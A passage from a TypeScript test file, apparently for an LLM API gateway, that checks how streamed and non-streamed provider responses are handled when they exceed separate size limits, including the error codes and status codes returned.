    );
    const result = readStreamed((await post(gateway, streamBody('hi'))).body);
    expect(result.content).toBe('partial answer');
    expect(result.error?.error.code).toBe('provider_timeout');
  });

  it('a stream larger than the stream size limit → provider_response_too_large error event', async () => {
    gateway = await startTestGateway({ maxStreamBytes: 4_000 });
    const events = ollamaStreamEvents(Array.from({ length: 40 }, () => 'word '));
    gateway.provider.respondWith(streamed([events[0]!, events.slice(1).join('')], { pauseMs: 30 }));
    const response = await post(gateway, streamBody('hi'));
    const expected = {
      error: {
        message: 'the provider response was larger than the response size limit',
        type: 'api_error',
        param: null,
        code: 'provider_response_too_large',
      },
    };
    // If both writes reach one network read, the cap trips before the first
    // chunk and the answer is an ordinary 502; otherwise it ends the stream
    // (bug-log 20). Same error either way.
    if (response.statusCode === 502) {
      expect(JSON.parse(response.body)).toEqual(expected);
    } else {
      expect(response.statusCode).toBe(200);
      expect(readStreamed(response.body).error).toEqual(expected);
    }
  });

  it('a stream larger than the non-streaming limit is not cut off (separate caps, ADR-020)', async () => {
    gateway = await startTestGateway({ maxResponseBytes: 1_000 });
    const words = Array.from({ length: 40 }, () => 'word ');
    gateway.provider.respondWith(streamed(ollamaStreamEvents(words)));
    const response = await post(gateway, streamBody('hi'));
    expect(response.statusCode).toBe(200);
    const result = readStreamed(response.body);
    expect([result.content, result.done, result.error]).toEqual([words.join(''), true, undefined]);
  });

  it('a non-streamed answer larger than the stream limit is read (separate caps, ADR-020)', async () => {
    gateway = await startTestGateway({ maxStreamBytes: 1_000 });
    gateway.provider.respondWith(okCompletion('x'.repeat(2_000)));
    const response = await post(gateway, chatBody('hi'));
    expect(response.statusCode).toBe(200);
  });

  it('a non-streamed answer larger than the response size limit → 502 provider_response_too_large', async () => {
    gateway = await startTestGateway({ maxResponseBytes: 1_000 });
    gateway.provider.respondWith(okCompletion('x'.repeat(2_000)));
    const response = await post(gateway, chatBody('hi'));
    expect(response.statusCode).toBe(502);
    expect((JSON.parse(response.body) as { error: { code: string } }).error.code).toBe(
      'provider_response_too_large',
    );
  });
});
